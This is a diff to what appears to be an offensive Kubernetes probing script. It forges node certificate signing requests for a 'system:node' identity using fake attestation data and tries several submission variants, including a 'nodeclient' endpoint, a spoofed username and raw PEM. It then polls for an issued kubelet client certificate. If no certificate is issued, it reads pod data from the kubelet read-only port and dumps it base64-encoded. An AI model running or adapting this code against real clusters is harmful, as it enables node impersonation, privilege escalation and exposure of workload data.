@@ -764,30 +764,55 @@ def csr():
                         "zone": "europe-west10-a", "instanceName": node, "instance": node}).encode()
     att_data = b"FAKE-ATTESTATION-DATA-" + os.urandom(32)
     att_sig = os.urandom(256)
-    variants = [("plain", b""), ("identity", b"-----BEGIN VM IDENTITY-----\n" + base64.encodebytes(ident) + b"-----END VM IDENTITY-----\n"),
-                ("attest", b"-----BEGIN ATTESTATION DATA-----\n" + base64.encodebytes(att_data) + b"-----END ATTESTATION DATA-----\n-----BEGIN ATTESTATION SIGNATURE-----\n" + base64.encodebytes(att_sig) + b"-----END ATTESTATION SIGNATURE-----\n-----BEGIN VM IDENTITY-----\n" + base64.encodebytes(ident) + b"-----END VM IDENTITY-----\n")]
+    variants = [("plain", b"", "main", False, False),
+                ("nc-user", b"", "nc", True, True),
+                ("nc-plain", b"", "nc", True, False),
+                ("nc-pem", b"", "nc-pem", True, False)]
     got = None
-    for tag, extra in variants:
+    for tag, extra, where, use_nc, set_user in variants:
         name = _csrname(keypem, "system:node:" + node, "system:nodes", usages)
         if tag != "plain":
             name = name + "-" + tag
         reqb64 = base64.b64encode(csr_pem + extra).decode()
-        cbody = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
-                            "metadata": {"name": name},
-                            "spec": {"request": reqb64, "signerName": "kubernetes.io/kube-apiserver-client-kubelet",
-                                     "usages": usages}}).encode()
-        s, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests", "POST", cbody)
-        out("CSR[%s] create status=%s %s" % (tag, s, b[:300].decode("utf8", "replace")))
+        spec = {"request": reqb64, "signerName": "kubernetes.io/kube-apiserver-client-kubelet", "usages": usages}
+        if set_user:
+            spec["username"] = "system:node:" + node
+        meta = {} if use_nc else {"name": name}
+        body = json.dumps({"apiVersion": "certificates.k8s.io/v1", "kind": "CertificateSigningRequest",
+                           "metadata": meta, "spec": spec}).encode()
+        ctype = "application/json"
+        path = "/apis/certificates.k8s.io/v1/certificatesigningrequests"
+        if where.startswith("nc"):
+            path = path + "/nodeclient?nodeName=" + urllib.parse.quote(node)
+        if where == "nc-pem":
+            body = csr_pem
+            ctype = "application/x-pem-file"
+        s, b = call(path, "POST", body, ctype=ctype)
+        out("CSR[%s] create status=%s %s" % (tag, s, b[:400].decode("utf8", "replace")))
+        nm2 = name
+        if s in (200, 201):
+            try:
+                j = json.loads(b)
+                nm2 = j["metadata"]["name"]
+                out("CSR[%s] SERVER-NAME %s spec.username=%r groups=%r" % (tag, nm2,
+                    (j.get("spec") or {}).get("username"), (j.get("spec") or {}).get("groups")))
+            except Exception:
+                pass
+        else:
+            continue
         cert = None
-        for i in range(40):
+        for i in range(24):
             time.sleep(3)
-            s, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + name)
+            s, b = call("/apis/certificates.k8s.io/v1/certificatesigningrequests/" + urllib.parse.quote(nm2))
             if s == 200:
                 d = json.loads(b)
                 c = d.get("status", {}).get("certificate")
-                out("CSR[%s] poll %d conds=%s certlen=%s" % (tag, i, d.get("status", {}).get("conditions"), len(c) if c else 0))
+                conds = d.get("status", {}).get("conditions") or []
+                out("CSR[%s] poll %d conds=%s certlen=%s" % (tag, i, [x.get("type") for x in conds], len(c) if c else 0))
                 if c:
                     cert = base64.b64decode(c)
+                    break
+                if any(x.get("type") == "Denied" for x in conds):
                     break
             elif s == 404:
                 out("CSR[%s] poll %d 404" % (tag, i))
@@ -799,6 +824,13 @@ def csr():
             break
     if not got:
         out("NO CERT ISSUED")
+        for url in ["http://%s:10255/pods" % nodeip]:
+            try:
+                r = urllib.request.urlopen(url, timeout=8); b = r.read()
+                out("NOCERT-KUBELET-RO %s status=%s len=%d" % (url, r.status, len(b)))
+                out("--kubelet-b64gzip--"); out(base64.b64encode(gzip.compress(b)).decode()); out("--kubelet-end--")
+            except Exception as e:
+                out("NOCERT-KUBELET-RO %s ERR %r" % (url, e))
         out("===CSR-END===")
         return
     ctxn = ssl.create_default_context(cafile="/tmp/ca.crt")
